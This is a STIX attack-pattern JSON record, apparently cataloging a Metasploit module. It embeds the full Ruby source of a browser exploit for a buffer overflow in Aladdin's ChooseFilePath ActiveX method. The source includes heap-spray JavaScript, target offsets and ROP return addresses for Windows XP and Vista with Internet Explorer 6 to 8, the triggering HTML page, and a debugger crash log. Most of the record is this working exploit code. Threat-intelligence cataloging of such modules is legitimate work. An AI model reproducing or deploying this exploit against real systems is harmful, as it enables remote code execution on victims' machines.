{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--47f87df6-bb8d-4e17-a266-2dcb5454f301",
    "created": "2024-08-14T16:40:28.908513Z",
    "modified": "2024-08-14T16:40:28.908517Z",
    "name": "\"Aladdin Knowledge System Ltd ChooseFilePath Buffer Overflow\"",
    "description": " This module exploits a vulnerability found in Aladdin Knowledge System's ActiveX component.  By supplying a long string of data to the ChooseFilePath() function, a buffer overflow occurs, which may result in remote code execution under the context of the user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/aladdin_choosefilepath_bof.rb",
            "external_id": "aladdin_choosefilepath_bof.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::BrowserExploitServer\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Aladdin Knowledge System Ltd ChooseFilePath Buffer Overflow\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in Aladdin Knowledge System's\n        ActiveX component.  By supplying a long string of data to the ChooseFilePath()\n        function, a buffer overflow occurs, which may result in remote code execution\n        under the context of the user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'shinnai',       #Vulnerability Discovery\n          'b33f',          #Original exploit\n          'sinn3r',        #Metasploit\n          'juan vazquez'   #Metasploit, IE8 target\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '86723' ],\n          [ 'EDB',   '22258' ],\n          [ 'EDB',   '22301' ]\n        ],\n      'Payload'        =>\n        {\n          'StackAdjustment' => -3500\n        },\n      'DefaultOptions'  =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'BrowserRequirements' =>\n        {\n          :source => /script|headers/i,\n          :activex => [\n            {\n              clsid: \"{09F68A41-2FBE-11D3-8C9D-0008C7D901B6}\",\n              method: \"ChooseFilePath\"\n            }\n          ],\n          :os_name => OperatingSystems::Match::WINDOWS,\n        },\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          [\n            'Windows XP with IE 6',\n              {\n                'os_name'   => OperatingSystems::Match::WINDOWS_XP,\n                'ua_name'   => 'MSIE',\n                'ua_ver'    => '6.0',\n                'Rop'       => false,\n                'Offset' => '0x5F4',\n                'Ret' => 0x0c0c0c0c\n              }\n          ],\n          [\n            'Windows XP with IE 7',\n              {\n                'os_name'   => OperatingSystems::Match::WINDOWS_XP,\n                'ua_name'   => 'MSIE',\n                'ua_ver'    => '7.0',\n                'Rop'       => false,\n                'Offset' => '0x5F4',\n                'Ret' => 0x0c0c0c0c\n              }\n          ],\n          [\n            'Windows XP with IE 8',\n              {\n                'os_name'   => OperatingSystems::Match::WINDOWS_XP,\n                'ua_name'   => 'MSIE',\n                'ua_ver'    => '8.0',\n                'Rop'       => true,\n                'Offset' => '0x5f6',\n                'Ret' => 0x77c2282e # stackpivot # mov esp,ebp # pop ebp # retn # msvcrt.dll\n              }\n          ],\n          [\n            'Windows Vista with IE 7',\n              {\n                'os_name'   => OperatingSystems::Match::WINDOWS_VISTA,\n                'ua_name'   => 'MSIE',\n                'ua_ver'    => '7.0',\n                'Rop'       => false,\n                'Offset' => '0x5F4',\n                'Ret' => 0x0c0c0c0c\n              }\n          ]\n\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-04-01',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n      ], self.class\n    )\n  end\n\n\n  def ie_heap_spray(p)\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(get_target.arch))\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4, Rex::Arch.endian(get_target.arch))\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    # Land the payload at 0x0c0c0c0c\n\n    js = %Q|\n    var heap_obj = new heapLib.ie(0x20000);\n    var code = unescape(\"#{js_code}\");\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n    while (nops.length < 0x80000) nops += nops;\n    var offset = nops.substring(0, #{get_target['Offset']});\n    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n    while (shellcode.length < 0x40000) shellcode += shellcode;\n    var block = shellcode.substring(0, (0x80000-6)/2);\n    heap_obj.gc();\n    for (var i=1; i < 0x300; i++) {\n      heap_obj.alloc(block);\n    }\n    |\n\n    js = heaplib(js, {:noobfu => true})\n\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n    end\n\n    return js\n  end\n\n  def exploit_template(cli, target_info)\n\n    if get_target['Rop']\n      p = generate_rop_payload('msvcrt', get_payload(cli, target_info), {'target'=>'xp'})\n    else\n      p = get_payload(cli, target_info)\n    end\n\n    spray = ie_heap_spray(p)\n    target_ret = Rex::Text.to_hex([get_target.ret].pack(\"V\"))\n\n    html_template = %Q|\n    <html>\n    <object id=\"pwnd\" classid=\"clsid:09F68A41-2FBE-11D3-8C9D-0008C7D901B6\"></object>\n    <script>\n    <%=spray%>\n    junk='';\n    for( counter=0; counter<=267; counter++) junk+=unescape(\"%0c\");\n    pwnd.ChooseFilePath(junk + \"<%=target_ret%>\");\n    </script>\n    </html>\n    |\n\n    return html_template, binding()\n  end\n\n  def on_request_exploit(cli, request, target_info)\n    print_status(\"Sending HTML...\")\n    send_exploit_html(cli, exploit_template(cli, target_info))\n  end\nend\n\n=begin\n0:008> g\n(82c.12dc): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=0c0c0c0c ebx=00001d56 ecx=020b93d4 edx=00001d56 esi=00001d60 edi=020b93e8\neip=7712a41a esp=020b93bc ebp=020b93c4 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\nOLEAUT32!SysReAllocStringLen+0x31:\n7712a41a 8b00            mov     eax,dword ptr [eax]  ds:0023:0c0c0c0c=????????\n0:008> g\n(82c.12dc): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=00000000 ebx=00000000 ecx=0c0c0c0c edx=7c9032bc esi=00000000 edi=00000000\neip=0c0c0c0c esp=020b8fec ebp=020b900c iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\n0c0c0c0c ??              ???\n0:008> db 020bf798\n020bf798  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................\n020bf7a8  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................\n020bf7b8  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................\n020bf7c8  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................\n020bf7d8  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................\n020bf7e8  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................\n020bf7f8  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................\n020bf808  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................\n=end\n",
    "x_mitre_disclosure_date": "2012-04-01",
    "x_mitre_platforms": [
        "win'"
    ]
}